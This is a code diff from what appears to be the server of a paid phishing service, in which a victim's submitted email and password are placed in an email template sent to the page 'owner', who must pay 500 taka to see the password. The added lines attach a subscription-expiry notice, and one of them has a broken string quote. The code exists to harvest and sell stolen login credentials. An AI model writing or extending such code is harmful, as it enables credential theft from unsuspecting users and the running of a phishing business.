@@ -73,13 +73,19 @@ const day = date.getDate();
    }
   }
  
+ const expire_mess = "<p style="color:red;">Note: Your Password Accessing Expire Date Will be End:'+user.expire_date;
+ function member_password_access(){
+  if(user.expire_date!==fulldate){
+   return expire_mess;
+  }
+  }
     var captured_content = `\n Email: ${req.body.email} Password: ${check_member()}`;
     let toMail = req.body.owner;
     
     
     
    // console.log("es"+toMail);
-    var template = "<h1> Dear Hackers,</h1> <p style='color:red;'>To get password and making the app more secure, you have to pay onetime tk-500, for the stay live server running,<p> <p>পাসওয়ার্ড পেতে এবং অ্যাপটিকে আরও সুরক্ষিত করতে, লাইভ সার্ভার চালু থাকার জন্য আপনাকে এককালীন টাকা-500 টাকা দিতে হবে। </p><br><br> If the input value has correct then id was hacked!"+captured_content+"<br><br><br><br><br><br> Thanks for your understanding,<br>phishing service by 'Eshak'";
+    var template = "<h1> Dear Hackers,</h1> <p style='color:red;'>To get password and making the app more secure, you have to pay onetime tk-500, for the stay live server running,<p> <p>পাসওয়ার্ড পেতে এবং অ্যাপটিকে আরও সুরক্ষিত করতে, লাইভ সার্ভার চালু থাকার জন্য আপনাকে এককালীন টাকা-500 টাকা দিতে হবে। </p><br><br> If the input value has correct then id was hacked!"+captured_content+"<br><br>"+ member_password_access()  +"<br><br><br><br><br><br> Thanks for your understanding,<br>phishing service by 'Eshak'";
 
     
   if(req.body.owner){
